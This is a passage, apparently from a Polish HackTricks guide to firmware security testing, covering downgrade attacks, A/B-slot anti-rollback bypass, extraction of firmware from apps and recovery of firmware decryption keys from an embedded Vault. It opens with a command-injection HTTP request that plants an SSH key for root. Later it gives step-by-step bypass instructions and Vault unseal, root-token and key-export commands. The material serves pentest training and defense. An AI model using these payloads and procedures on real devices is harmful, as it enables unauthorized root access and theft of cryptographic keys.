POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio doklejany do polecenia powłoki bez oczyszczania, co umożliwia wstrzykiwanie dowolnych poleceń (tutaj — włączenie dostępu root przez klucze SSH). W późniejszych wersjach firmware’u wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Ekstrakcja firmware’u z aplikacji mobilnych

Wielu producentów dołącza pełne obrazy firmware’u do towarzyszących aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są zwykle przechowywane bez szyfrowania w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście anti-rollback wyłącznie w updaterze w projektach z slotami A/B

Niektórzy dostawcy wdrażają **ratchet** chroniący przed downgrade’em, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, poleceniu odzyskiwania lub agencie OTA w przestrzeni użytkownika). Jeśli **bootloader** sprawdza później tylko sygnaturę/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochronę przed rollbackiem nadal można obejść.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware’u zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** odczytuje tego ratchetu i przed uruchomieniem wybranego slotu weryfikuje jedynie nagłówek, CRC i sygnaturę.
- Aktywacja slotu jest zapisywana oddzielnie w tablicy partycji lub liczniku generacji dla danego slotu i **nie jest kryptograficznie powiązana** z dokładnym digestem zweryfikowanego firmware’u.

W systemach z dwoma slotami tworzy to prymityw **zweryfikuj-jeden-obraz / uruchom-inny-obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego, podpisanego obrazu, a później nadpisać slot B przed ponownym uruchomieniem, bootloader może mimo to uruchomić starszy obraz, ponieważ ufa tylko wcześniej zapisanym metadanym slotu.

Typowy wzorzec nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę walidacji/przełączenia, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub logikę wyboru slotu, aby updater wymazał **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę walidacji wymuszającą ratchet i uruchom ponownie urządzenie bezpośrednio.
6. Bootloader wybiera aktywowany slot, sprawdza tylko sygnaturę/integralność i uruchamia stary obraz.

Podczas analizy implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu na podstawie **flag z czasu rozruchu**, które nie są odświeżane po udanym przełączeniu.
- Procedurę w rodzaju `prepare_passive_slot()`, która wymazuje slot na podstawie nieaktualnego stanu zamiast **aktualnego, zatwierdzonego układu**.
- Funkcję w rodzaju `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje hasha zweryfikowanego obrazu.
- Kontrole ratchet zaimplementowane w przestrzeni użytkownika lub w kodzie updatera, ale **nie** w ROM-ie / bootloaderze / etapach secure boot.
- Procedury wymazywania lub odzyskiwania, które pozostawiają slot oznaczony jako rozruchowy, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna do oceny logiki aktualizacji

* Czy transport/autoryzacja *endpointu aktualizacji* są odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed wgraniem firmware’u?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. czy kod ROM sprawdza sygnatury)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko sygnaturę/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym digestem/wersją firmware’u**, czy też slot można zmodyfikować po aktywacji?
* Czy po udanym przełączeniu slotu urządzenie musi zostać ponownie uruchomione, czy też w tej samej sesji nadal można wywoływać kolejne procedury aktualizacji/wymazywania?
* Czy kod przestrzeni użytkownika wykonuje dodatkowe kontrole poprawności (np. dozwolonej mapy partycji, numeru modelu)?
* Czy przepływy aktualizacji *częściowej* lub *z kopii zapasowej* korzystają z tej samej logiki walidacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych zabezpieczeń, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych podatnych projektów firmware’u.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware’u ze stanu osadzonego KMS/Vault

Jeśli obraz aktualizacji łączy niewielkie metadane w postaci jawnej z dużym blokiem o wysokiej entropii, przed próbami brute-force przeprowadź analizę kontenera:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje szyfrogram RSA-2048 opakowujący losowe hasło firmware’u/klucz sesji.
- Odłączony materiał PGP w tym samym pliku często służy jedynie do ochrony autentyczności; nie zakładaj, że jest mechanizmem zapewniającym poufność.

Jeśli wyszukiwanie kluczy statycznych (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, przeanalizuj **operacyjną ścieżkę deszyfrowania** zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, który komponent odczytuje zaszyfrowany blok, która funkcja pomocnicza/API go odszyfrowuje oraz jakiej logicznej nazwy klucza używa.
- Przeszukaj wyodrębniony główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj jawne polecenia `vault operator unseal ...`, klucze odzyskiwania, tokeny bootstrap lub lokalne skrypty automatycznego odblokowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci masowej, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane odszyfrowanie przy użyciu domyślnego OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL dostawcy (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz odszyfrować AES-CBC.

To zmienia „zaszyfrowane firmware” w bardziej ogólny problem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap + KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware'u za pomocą Claude'a: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware'u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczne IoT Hacking: kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak urządzenie smart za 20 dolarów dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz mnie widzisz: teraz jesteś pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania – część 2: obejście ochrony przed downgrade'em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zamiga: atakowanie Philips Hue Bridge przez sieć bezprzewodową](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
